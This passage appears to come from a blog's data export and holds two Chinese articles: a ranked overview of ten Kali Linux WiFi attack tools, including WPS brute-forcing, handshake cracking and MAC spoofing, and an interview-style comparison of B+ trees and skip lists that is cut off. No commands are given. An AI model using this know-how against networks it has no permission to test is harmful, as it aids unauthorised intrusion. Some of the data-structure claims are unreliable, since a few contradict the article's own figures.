Aircrack-ng\n----------------\n\nAircrack是目前WEP/WPA/WPA2破解领域中最热门的工具，Aircrack-ng套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。Aircrack-ng是一款多合一整合套件，该套件大致包含下列几种工具：\n\n> \\-Aircrack-ng：无线密码破解\n>\n> \\-Aireplay：生成网络数据，去客户端验证\n>\n> \\-Airodump-ng：数据包捕捉\n>\n> \\-Airbase-ng：配置伪造的接入点\n\nAircrack-ng可以在Linux、Windows和macOS上运行，并且KaliLinux默认自带了该套件。如果你准备使用这款工具，那么你还需要确保自己的无线网卡具备数据包注入功能。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/1.png)\n\n2.   Reaver\n-----------\n\n排名第二的是Reaver，Reaver也是目前流行的无线网络攻击工具，它主要针对的是WPS漏洞。Reaver会对WiFi保护设置（WPS）的注册PIN码进行暴力破解攻击，并尝试恢复出WPA/WPA2密码。由于很多路由器制造商和ISP会默认开启WPS功能，因此市面上的很多路由器都无法抵御这种攻击。\n\n在使用Reaver时，无线路由器的信号一定要足够强。平均来说，Reaver可以在4-10个小时之内破解目标路由器的密码，具体破解时长还要根据接入点类型、信号强度和PIN码本身来判断。从概率论和统计学的角度来看，你有50%的机会只需要花一半时间就能够破解出目标路由器的PIN码。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/2.png)\n\n3.   Pixiewps\n-------------\n\nPixieWPS是Kali Linux新加入的一款专门针对WPS漏洞的渗透工具。PixieWPS使用C语言开发，可以用来离线爆破WPS PIN码。它所使用的技术名叫pixie dust攻击，需要注意的是，PixieWPS需要一个修改版的Reaver或Wifite才能正常运行。由于这款工具在短时间内就变得非常受欢迎了，因此它在我们的排行榜上排到了第三名。\n\n4.   Wifite\n-----------\n\nWifite是一款能够攻击多种无线加密方式（WEP/WPA/WPA2和WPS）的自动化工具， Wifite在运行之前需要提供几个参数，而Wifite将会自动帮我们完成所有的任务。它可以捕获WPA握手包，自动化去客户端验证，进行MAC地址欺骗，以及破解WiFi密码。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/3.png)\n\n5.   Wireshark\n--------------\n\nWireshark算得上是目前最好的网络协议分析工具了，在Wireshark的帮助下，你能够深入地分析一个网络，并获取到尽可能多的信息。Wireshark能够实时捕获网络数据包、对上百种协议进行深入分析、以及浏览和过滤数据包。需要注意的是，Wireshark是一款跨平台工具。\n\nKaliLinux默认自带了Wireshark，不过Windows和macOS用户都可以使用它。如果你想使用Wireshark的某些特殊功能，那么你需要一款支持监听模式的WiFi适配器。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/4.png)\n\n6.   oclHashcat\n---------------\n\noclHashcat并不是一款专用的WiFi入侵工具，而且它也不是Kali Linux的自带工具，但它能够对捕捉到的握手包进行高速爆破攻击和字典攻击（使用GPU跑字典）。在使用了Aircrack-ng或其他工具捕捉到了握手包之后，我们就可以使用GPU和oclHashcat来破解WiFi密码了，而且GPU+oclHashcat的破解速度要比CPU+Aircrack-ng的速度快得多。\n\noclHashcat适用于Windows和Linux，并且还有专门针对AMD和Nvidia显卡的版本。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/5.png)\n\n7.   Fern Wifi Cracker\n----------------------\n\nFern Wifi Cracker是一款针对无线网络的安全审计工具和攻击工具，该工具采用Python编写，它也是这十大无线攻击工具中唯一一款具有图形用户界面的工具。Fern Wifi Cracker能够破解WEP、WPA和WPS密钥，并且还包含有能够执行MiTM（中间人攻击）攻击的组件。\n\n8.   Wash\n---------\n\n当攻击者在对WPS PIN码进行暴力破解攻击时，很多接入点会将自己锁定以保证路由器的安全性。而Wash就是一款能够确定目标接入点是否开启了WPS的工具，在使用Reaver进行了多次尝试之后，你可以用Wash来检查接入点是否锁定了WPS。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/6.png)\n\n9.   Crunch\n-----------\n\nCrunch可以用来生成自定义字典，而生成的字典可以用于字典攻击。由于字典攻击的成功率依赖于所使用字典的质量，因此我们总是不可避免地要根据自己的需要来生成字典。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/7.png)\n\n10\\.  Macchanger\n----------------\n\n实际上，Macchanger是一款能够将你设备的MAC地址改成随机值的小工具，当然了，你也可以将其修改为你想要的数据。为了避免目标设备采用了MAC地址过滤，所以对于WiFi攻击来说，MAC地址修改就显得非常重要了。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/8.png)\n\n总结\n--\n\n希望本文总结出的十大热门WiFi攻击工具能够给大家提供一定的帮助，就目前的情况来看，无线网络的安全性仍然有很大的提升空间，而这种安全性的提升需要整个社区贡献自己的力量。\n","slug":"Kali中优秀Wifi渗透工具前10","published":1,"updated":"2024-07-14T11:26:50.924Z","comments":1,"layout":"post","photos":[],"_id":"clylh1rxx0008bsuhet3x66b2","content":"<p><strong>这篇文章要讨论的是目前一个非常热门的话题：渗透无线网络以及如何防止无线网络被入侵。WiFi通常都是网络环境中的一个薄弱环节，因为WiFi信号可以在范围内的任何一个地方被任何一个人捕捉到，而且只要有正确的工具以及合适的软件（例如Kali Linux），很多无线路由器中存在的安全漏洞都是可以被攻击者轻松利用的。</strong></p>\n<p>接下来，我们将会给大家介绍目前最热门的十大WiFi入侵工具，这些工具可以帮助我们测试无线网络环境中存在的潜在安全问题。</p>\n<ol>\n<li>  Aircrack-ng</li>\n</ol>\n<hr>\n<p>Aircrack是目前WEP&#x2F;WPA&#x2F;WPA2破解领域中最热门的工具，Aircrack-ng套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。Aircrack-ng是一款多合一整合套件，该套件大致包含下列几种工具：</p>\n<blockquote>\n<p>-Aircrack-ng：无线密码破解</p>\n<p>-Aireplay：生成网络数据，去客户端验证</p>\n<p>-Airodump-ng：数据包捕捉</p>\n<p>-Airbase-ng：配置伪造的接入点</p>\n</blockquote>\n<p>Aircrack-ng可以在Linux、Windows和macOS上运行，并且KaliLinux默认自带了该套件。如果你准备使用这款工具，那么你还需要确保自己的无线网卡具备数据包注入功能。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/1.png\"></p>\n<ol start=\"2\">\n<li>  Reaver</li>\n</ol>\n<hr>\n<p>排名第二的是Reaver，Reaver也是目前流行的无线网络攻击工具，它主要针对的是WPS漏洞。Reaver会对WiFi保护设置（WPS）的注册PIN码进行暴力破解攻击，并尝试恢复出WPA&#x2F;WPA2密码。由于很多路由器制造商和ISP会默认开启WPS功能，因此市面上的很多路由器都无法抵御这种攻击。</p>\n<p>在使用Reaver时，无线路由器的信号一定要足够强。平均来说，Reaver可以在4-10个小时之内破解目标路由器的密码，具体破解时长还要根据接入点类型、信号强度和PIN码本身来判断。从概率论和统计学的角度来看，你有50%的机会只需要花一半时间就能够破解出目标路由器的PIN码。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/2.png\"></p>\n<ol start=\"3\">\n<li>  Pixiewps</li>\n</ol>\n<hr>\n<p>PixieWPS是Kali Linux新加入的一款专门针对WPS漏洞的渗透工具。PixieWPS使用C语言开发，可以用来离线爆破WPS PIN码。它所使用的技术名叫pixie dust攻击，需要注意的是，PixieWPS需要一个修改版的Reaver或Wifite才能正常运行。由于这款工具在短时间内就变得非常受欢迎了，因此它在我们的排行榜上排到了第三名。</p>\n<ol start=\"4\">\n<li>  Wifite</li>\n</ol>\n<hr>\n<p>Wifite是一款能够攻击多种无线加密方式（WEP&#x2F;WPA&#x2F;WPA2和WPS）的自动化工具， Wifite在运行之前需要提供几个参数，而Wifite将会自动帮我们完成所有的任务。它可以捕获WPA握手包，自动化去客户端验证，进行MAC地址欺骗，以及破解WiFi密码。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/3.png\"></p>\n<ol start=\"5\">\n<li>  Wireshark</li>\n</ol>\n<hr>\n<p>Wireshark算得上是目前最好的网络协议分析工具了，在Wireshark的帮助下，你能够深入地分析一个网络，并获取到尽可能多的信息。Wireshark能够实时捕获网络数据包、对上百种协议进行深入分析、以及浏览和过滤数据包。需要注意的是，Wireshark是一款跨平台工具。</p>\n<p>KaliLinux默认自带了Wireshark，不过Windows和macOS用户都可以使用它。如果你想使用Wireshark的某些特殊功能，那么你需要一款支持监听模式的WiFi适配器。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/4.png\"></p>\n<ol start=\"6\">\n<li>  oclHashcat</li>\n</ol>\n<hr>\n<p>oclHashcat并不是一款专用的WiFi入侵工具，而且它也不是Kali Linux的自带工具，但它能够对捕捉到的握手包进行高速爆破攻击和字典攻击（使用GPU跑字典）。在使用了Aircrack-ng或其他工具捕捉到了握手包之后，我们就可以使用GPU和oclHashcat来破解WiFi密码了，而且GPU+oclHashcat的破解速度要比CPU+Aircrack-ng的速度快得多。</p>\n<p>oclHashcat适用于Windows和Linux，并且还有专门针对AMD和Nvidia显卡的版本。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/5.png\"></p>\n<ol start=\"7\">\n<li>  Fern Wifi Cracker</li>\n</ol>\n<hr>\n<p>Fern Wifi Cracker是一款针对无线网络的安全审计工具和攻击工具，该工具采用Python编写，它也是这十大无线攻击工具中唯一一款具有图形用户界面的工具。Fern Wifi Cracker能够破解WEP、WPA和WPS密钥，并且还包含有能够执行MiTM（中间人攻击）攻击的组件。</p>\n<ol start=\"8\">\n<li>  Wash</li>\n</ol>\n<hr>\n<p>当攻击者在对WPS PIN码进行暴力破解攻击时，很多接入点会将自己锁定以保证路由器的安全性。而Wash就是一款能够确定目标接入点是否开启了WPS的工具，在使用Reaver进行了多次尝试之后，你可以用Wash来检查接入点是否锁定了WPS。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/6.png\"></p>\n<ol start=\"9\">\n<li>  Crunch</li>\n</ol>\n<hr>\n<p>Crunch可以用来生成自定义字典，而生成的字典可以用于字典攻击。由于字典攻击的成功率依赖于所使用字典的质量，因此我们总是不可避免地要根据自己的需要来生成字典。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/7.png\"></p>\n<h2 id=\"10-Macchanger\"><a href=\"#10-Macchanger\" class=\"headerlink\" title=\"10.  Macchanger\"></a>10.  Macchanger</h2><p>实际上，Macchanger是一款能够将你设备的MAC地址改成随机值的小工具，当然了，你也可以将其修改为你想要的数据。为了避免目标设备采用了MAC地址过滤，所以对于WiFi攻击来说，MAC地址修改就显得非常重要了。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/8.png\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>希望本文总结出的十大热门WiFi攻击工具能够给大家提供一定的帮助，就目前的情况来看，无线网络的安全性仍然有很大的提升空间，而这种安全性的提升需要整个社区贡献自己的力量。</p>\n","cover":"/img/hubian.png","cover_type":"img","excerpt":"","more":"<p><strong>这篇文章要讨论的是目前一个非常热门的话题：渗透无线网络以及如何防止无线网络被入侵。WiFi通常都是网络环境中的一个薄弱环节，因为WiFi信号可以在范围内的任何一个地方被任何一个人捕捉到，而且只要有正确的工具以及合适的软件（例如Kali Linux），很多无线路由器中存在的安全漏洞都是可以被攻击者轻松利用的。</strong></p>\n<p>接下来，我们将会给大家介绍目前最热门的十大WiFi入侵工具，这些工具可以帮助我们测试无线网络环境中存在的潜在安全问题。</p>\n<ol>\n<li>  Aircrack-ng</li>\n</ol>\n<hr>\n<p>Aircrack是目前WEP&#x2F;WPA&#x2F;WPA2破解领域中最热门的工具，Aircrack-ng套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。Aircrack-ng是一款多合一整合套件，该套件大致包含下列几种工具：</p>\n<blockquote>\n<p>-Aircrack-ng：无线密码破解</p>\n<p>-Aireplay：生成网络数据，去客户端验证</p>\n<p>-Airodump-ng：数据包捕捉</p>\n<p>-Airbase-ng：配置伪造的接入点</p>\n</blockquote>\n<p>Aircrack-ng可以在Linux、Windows和macOS上运行，并且KaliLinux默认自带了该套件。如果你准备使用这款工具，那么你还需要确保自己的无线网卡具备数据包注入功能。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/1.png\"></p>\n<ol start=\"2\">\n<li>  Reaver</li>\n</ol>\n<hr>\n<p>排名第二的是Reaver，Reaver也是目前流行的无线网络攻击工具，它主要针对的是WPS漏洞。Reaver会对WiFi保护设置（WPS）的注册PIN码进行暴力破解攻击，并尝试恢复出WPA&#x2F;WPA2密码。由于很多路由器制造商和ISP会默认开启WPS功能，因此市面上的很多路由器都无法抵御这种攻击。</p>\n<p>在使用Reaver时，无线路由器的信号一定要足够强。平均来说，Reaver可以在4-10个小时之内破解目标路由器的密码，具体破解时长还要根据接入点类型、信号强度和PIN码本身来判断。从概率论和统计学的角度来看，你有50%的机会只需要花一半时间就能够破解出目标路由器的PIN码。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/2.png\"></p>\n<ol start=\"3\">\n<li>  Pixiewps</li>\n</ol>\n<hr>\n<p>PixieWPS是Kali Linux新加入的一款专门针对WPS漏洞的渗透工具。PixieWPS使用C语言开发，可以用来离线爆破WPS PIN码。它所使用的技术名叫pixie dust攻击，需要注意的是，PixieWPS需要一个修改版的Reaver或Wifite才能正常运行。由于这款工具在短时间内就变得非常受欢迎了，因此它在我们的排行榜上排到了第三名。</p>\n<ol start=\"4\">\n<li>  Wifite</li>\n</ol>\n<hr>\n<p>Wifite是一款能够攻击多种无线加密方式（WEP&#x2F;WPA&#x2F;WPA2和WPS）的自动化工具， Wifite在运行之前需要提供几个参数，而Wifite将会自动帮我们完成所有的任务。它可以捕获WPA握手包，自动化去客户端验证，进行MAC地址欺骗，以及破解WiFi密码。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/3.png\"></p>\n<ol start=\"5\">\n<li>  Wireshark</li>\n</ol>\n<hr>\n<p>Wireshark算得上是目前最好的网络协议分析工具了，在Wireshark的帮助下，你能够深入地分析一个网络，并获取到尽可能多的信息。Wireshark能够实时捕获网络数据包、对上百种协议进行深入分析、以及浏览和过滤数据包。需要注意的是，Wireshark是一款跨平台工具。</p>\n<p>KaliLinux默认自带了Wireshark，不过Windows和macOS用户都可以使用它。如果你想使用Wireshark的某些特殊功能，那么你需要一款支持监听模式的WiFi适配器。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/4.png\"></p>\n<ol start=\"6\">\n<li>  oclHashcat</li>\n</ol>\n<hr>\n<p>oclHashcat并不是一款专用的WiFi入侵工具，而且它也不是Kali Linux的自带工具，但它能够对捕捉到的握手包进行高速爆破攻击和字典攻击（使用GPU跑字典）。在使用了Aircrack-ng或其他工具捕捉到了握手包之后，我们就可以使用GPU和oclHashcat来破解WiFi密码了，而且GPU+oclHashcat的破解速度要比CPU+Aircrack-ng的速度快得多。</p>\n<p>oclHashcat适用于Windows和Linux，并且还有专门针对AMD和Nvidia显卡的版本。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/5.png\"></p>\n<ol start=\"7\">\n<li>  Fern Wifi Cracker</li>\n</ol>\n<hr>\n<p>Fern Wifi Cracker是一款针对无线网络的安全审计工具和攻击工具，该工具采用Python编写，它也是这十大无线攻击工具中唯一一款具有图形用户界面的工具。Fern Wifi Cracker能够破解WEP、WPA和WPS密钥，并且还包含有能够执行MiTM（中间人攻击）攻击的组件。</p>\n<ol start=\"8\">\n<li>  Wash</li>\n</ol>\n<hr>\n<p>当攻击者在对WPS PIN码进行暴力破解攻击时，很多接入点会将自己锁定以保证路由器的安全性。而Wash就是一款能够确定目标接入点是否开启了WPS的工具，在使用Reaver进行了多次尝试之后，你可以用Wash来检查接入点是否锁定了WPS。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/6.png\"></p>\n<ol start=\"9\">\n<li>  Crunch</li>\n</ol>\n<hr>\n<p>Crunch可以用来生成自定义字典，而生成的字典可以用于字典攻击。由于字典攻击的成功率依赖于所使用字典的质量，因此我们总是不可避免地要根据自己的需要来生成字典。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/7.png\"></p>\n<h2 id=\"10-Macchanger\"><a href=\"#10-Macchanger\" class=\"headerlink\" title=\"10.  Macchanger\"></a>10.  Macchanger</h2><p>实际上，Macchanger是一款能够将你设备的MAC地址改成随机值的小工具，当然了，你也可以将其修改为你想要的数据。为了避免目标设备采用了MAC地址过滤，所以对于WiFi攻击来说，MAC地址修改就显得非常重要了。</p>\n<p><img src=\"/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/8.png\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>希望本文总结出的十大热门WiFi攻击工具能够给大家提供一定的帮助，就目前的情况来看，无线网络的安全性仍然有很大的提升空间，而这种安全性的提升需要整个社区贡献自己的力量。</p>\n"},{"title":"Mysql为什么用B+树不用跳表","date":"2024-06-02T09:33:50.000Z","_content":"\n\n字节面试： Mysql为什么用B+树，不用跳表？\n========================\n\n**最近有小伙伴在蚂蚁、面试字节，都问到了相关的面试题，可以说是逢面必问。**\n\n小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。\n\n索引的作用和重要性\n---------\n\n索引是帮助MySQL高效获取数据的数据结构，注意，是帮助高性能的获取数据\n\n索引好比是一本书的目录，可以直接根据页码找到对应的内容，目的就是为了`加快数据库的查询速度`。\n\n*   索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。\n\n*   索引是一种能帮助mysql提高了查询效率的数据结构：**索引数据结构**。\n\n\n索引的存储原理大致可以概括为一句话：**以空间换时间**。\n\n数据库在未添加索引, 进行查询的时候默认是进行全文搜索，也就是说有多少数据就进行多少次查询，然后找到相应的数据就把它们放到结果集中，直到全文扫描完毕。\n\n数据库添加了索引之后，通过索引快速找到数据在磁盘上的位置，可以快速的读取数据，而不同从头开始全表扫描。\n\n一般来说索引本身也很大，不可能全部存储在内存中，因此索引往往是存储在磁盘上的文件中的（可能存储在单独的索引文件中，也可能和数据一起存储在数据文件中）。\n\n### 索引的作用和重要性\n\n*   加快数据检索速度\n\n    索引允许数据库系统快速定位到符合查询条件的记录，从而显著提高查询操作的效率。\n\n*   降低数据库IO成本\n\n    通过索引，数据库在查询时需要读取的数据量减少，这样可以减少磁盘IO操作的次数和压力，进而提升整体的数据库性能。\n\n*   保证数据的完整性\n\n    索引可以包含唯一性约束，这有助于确保表中数据的唯一性，防止出现重复记录。\n\n*   加速表连接\n\n    在涉及多表查询时，索引可以帮助加速表与表之间的连接操作，实现表与表之间的参照完整性。\n\n*   优化排序和分组操作\n\n    当使用分组、排序等操作进行数据检索时，索引可以显著减少处理的数据量，从而提高这些操作的效率。\n\n\nB+数和跳表的整体结构\n-----------\n\n整体上，B+数和跳表 都是 链表+ 多级索引组合 的结构\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/1.png)\n\n#### 什么是MySQL中的B+Tree\n\nMySQL中的B+Tree 原理\n\n*   B+Tree一般由多个页、多层级组成，在MySQL中每个页 16 KB。\n\n*   主键索引的 B+ 树的叶子结点才是数据，非叶子结点（内节点）存放的是索引信息。\n\n*   上下层的页通过单指针相连。\n\n*   同一层级的相邻的数据页通过双指针相邻。\n\n*   B+Tree的结构\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/2.png)\n\n\n### B+Tree的查询过程\n\nB+Tree是由多个页组成的多层级结构，每个页16kb，对于主键索引来说，最末级的叶子节点放行数据，\n\n非叶子节点放的是索引信息(主键ID和页号),用于加速查询。\n\n我们想要查询数据5，会从顶层页的record开始，record里包含了主键Id和页号(页地址),\n\n顶层页 向左最小id是1，最右最小id是7，\n\n那id=5的数据如果存在，那必定在顶层页 左边箭头，于是顺着的record的页地址就到了`6号`数据页里，\n\n再判断id=5>4，所以肯定在右边的数据页里，于是加载`105号`数据页。\n\n在`105号数据页`里，虽然有多行数据，但也**不是挨个遍历的**，数据页内还有个**页目录**的信息，里边是有序的。\n\n所以，数据页内可以通过**二分查找**的方式加速查询行数据，于是找到id=5的数据行，完成查询。\n\n从上面可以看出，B+Tree利用了**空间换时间的**方式，**将查询时间复杂度从O(n)优化为O(lg(n))**。\n\n### B+Tree的优点和缺点\n\n*   B+Tree是一种平衡树结构，它具有根节点、内部节点和叶子节点。\n\n*   每个节点包含一定数量的键值对，键值对按键值大小有序排列。\n\n*   内部节点只包含键，叶子节点同时包含键和指向数据的指针。\n\n\n**B+Tree的优点**\n\n*   范围查询效率高：B+Tree支持范围查询，因为在B+Tree中，相邻的叶子节点是有序的，所以在查找范围内的数据时非常高效。\n\n*   事务支持：B+Tree是一种多版本并发控制（MVCC）友好的数据结构，适用于事务处理场景，能够保证事务的ACID属性。\n\n*   数据持久性：B+Tree的叶子节点包含所有数据，这意味着数据非常容易持久化到磁盘上，支持高可靠性和数据恢复。\n\n\n**B+Tree的缺点**\n\n*   **插入和删除开销较高**：由于B+Tree的平衡性质，插入和删除操作可能需要进行节点的分裂和合并，这会导致性能开销较大。\n\n*   高度不稳定：B+Tree的高度通常比较大，**可能需要多次磁盘I/O才**能访问叶子节点，对于某些特定查询可能效率不高。\n\n\n跳表\n--\n\n### 跳表的原理\n\n跳表是一种采用了用空间换时间思想的数据结构。\n\n跳表会随机地将一些节点提升到更高的层次，以创建一种逐层的数据结构，以提高操作的速度。\n\n### 跳表的结构\n\n跳表的做法就是给链表做索引，而且是分层索引，\n\n### 单层跳表\n\n单层跳表, 可以退化到一个链表\n\n查找的时间复杂度是 O（N）\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/3.png)\n### 两层跳表\n\n两层跳表 = 原始链表 + 一层索引\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/4.png)\n### 两层跳表查询\n\n如查询id=11的数据，我们先在上层遍历，依次判断1,6,12，\n\n很快就可以判断出11在6到12之间，\n\n第二步，然后往下一跳，进入原始链表，就可以在遍历6,7,8,9,10,11之后，确定id=11的位置。\n\n通过第一级索引，直接将查询范围从原来的1到11，缩小到现在的1,6,7,8,9,10,11。\n\n### 三层跳表\n\n三层跳表 = 原始链表 + 第一层索引 + 第二层索引\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/5.png)\n### 三层跳表查询\n\n如果还是查询id=11的数据，就只需要查询1,6,9,10,11就能找到，比两层的时候更快一些。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/6.png)\n### 跳表查找的时间复杂度\n\n在一个单链表中查询某个数据的时间复杂度是 O(n)。也就是说，单层的跳表， 时间复杂度是 O(n)。\n\n跳表 就是 为链表 增加多级索引， 完成空间换时间， 实现 时间复杂度是 O(logn)。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/7.png)\n这个时间复杂度的分析方法比较难想到。\n\n先问题分解一下，先来看这样一个问题，如果链表里有 n 个结点，会有多少级索引呢？\n\n在跳表中，假设每两个结点，会抽出一个结点作为上一级索引的结点。\n\n那么，索引有多少级，每一级有多少个node呢：\n\n*   第一级索引的结点个数大约就是 n/2，\n\n*   第二级索引的结点个数大约就是 n/4，\n\n*   第三级索引的结点个数大约就是 n/8，\n\n\n依次类推，也就是说，\n\n*   第 k 级索引的结点个数是第 k-1 级索引的结点个数的 1/2，\n\n*   那第 k级索引结点的个数就是 n/(2的k次方)。\n\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/8.png)\n假设索引有 h 级，最高级的索引有 2 个结点。\n\n通过上面的公式，我们可以得到 n/(2^h)=2，从而求得 h=log2n-1。\n\n如果包含原始链表这一层，整个跳表的高度就是 log2n。\n\n我们在跳表中查询某个数据的时候，如果每一层都要遍历 m 个结点，那在跳表中查询一个数据的时间复杂度就是 O(m\\*logn)。\n\n那m到底是多少呢?\n\n假设我们要查找的数据是 x，在第 k 级索引中，我们遍历到 y 结点之后，发现 x 大于 y，小于后面的结点 z，所以我们通过 y 的 down 指针，从第 k 级索引下降到第 k-1 级索引。\n\n在第 k-1 级索引中，y 和 z 之间只有 3 个结点（包含 y 和 z），所以，我们在 K-1 级索引中最多只需要遍历 3 个结点，依次类推，每一级索引都最多只需要遍历 3 个结点。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/9.png)\n过上面的分析，我们得到 m=3，\n\n所以在跳表中查询任意数据的时间复杂度就是 O(logn)。\n\n这个查找的时间复杂度跟二分查找是一样的，这也体现了空间换时间的效率之高。\n\n### 跳表(Skip List)的优点和缺点\n\n跳表是一种多层级的数据结构，每一层都是一个有序链表，\n\n最底层包含所有数据，而上层包含的数据是下层的子集，通过跳跃节点快速定位目标数据。\n\n**跳表(Skip List)的优点**\n\n*   平均**查找时间较低**：跳表的查询时间复杂度为O(log n)，与平衡树结构相似，但实现起来较为简单。\n\n*   插入和删除操作相对较快：由于跳表不需要进行节点的频繁平衡调整，插入和删除操作的性能较好。\n\n\n**跳表(Skip List)的缺点**\n\n*   难以实现**事务和数据持久性**：跳表的更新操作可能涉及多个层级，实现事务和数据持久性要求更复杂。\n\n*   空间开销较大：跳表需要额外的指针来连接不同层级，占用的内存空间较多。\n\n\nB+Tree 和 跳表(Skip List) 的在数据结构上的区别\n---------------------------------\n\n都是 多级索引 +链表\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/10.png)\n### IO 操作的单位 不同\n\nB+Tree 是page （16K）\n\n跳表(Skip List) 是 node 节点 ，一个node 几十个字节\n\n### 树的高度 不同\n\n**B+树**是多叉树结构，每个结点都是一个`16k`的数据页，能存放较多索引信息。\n\n同样的数据，树的高度比较小。 三层B+左右就可以存储2kw左右的数据。\n\n如果，把三层B+树塞满，那大概需要2kw左右的数据。 也就是说查询一次数据，如果这些数据页都在磁盘里，那么**最多需要查询三次磁盘IO**。\n\n跳表是链表结构，一条数据一个结点，\n\n如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，\n\n所以，2kw数据的跳表大概高度在24层左右。 如果要一个节点要进行一次磁盘IO，大概要进行 24次。\n\nB+Tree 和 跳表(Skip List) 的新增数据区别\n------------------------------\n\n了解了二者的基本情况之后，接下来，对B+Tree 和 跳表(Skip List) 的数据插入进行对比。\n\nB+Tree和跳表的叶子层，都包含了所有的数据，且叶子层都是顺序的，适合用于范围查询。\n\n来看看，B+Tree和跳表新增和删除数据的差异\n\n### B+Tree 新增数据\n\n**场景1： 叶子结点和索引结点都没满**\n\nB+Tree 直接插入到叶子结点中就好了。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/11.png)\n**场景2：叶子结点满了，但索引结点没满**\n\nB+Tree 需要拆分叶子结点，同时索引结点要增加新的索引信息。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/12.png)\n**场景3：叶子结点满了，且索引结点也满了**\n\n叶子和索引结点都要拆分，同时往上还要再**加一层索引。**\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/13.png)\nB+树是一种多叉平衡二叉树，要维护各个分支的高度差距，不能太大，平衡意味着子树们的高度层级尽量一致（一般最多差一个层级）。\n\n为啥要平衡呢？平衡意味着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。\n\n所以，为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 **数据页的 分裂**。\n\n### 跳表新增数据\n\n跳表同样也是很多层，新增一个数据时，最底层的链表需要插入数据，\n\n然后，考虑是否需要在上面几层中加入数据做索引 ？ 这个就靠**随机函数**了。\n\n例如: 如果跳表中插入数据id=6，且随机函数返回第三层（有25%的概率），那就需要在跳表的最底层到第三层都插入数据。\n\n跳表跟B+树不一样，跳表是否新增层数，纯粹靠随机函数，不太关心平衡的问题。\n\nB+Tree和跳表的在新增数据上的区别\n-------------------\n\n#### B+Tree 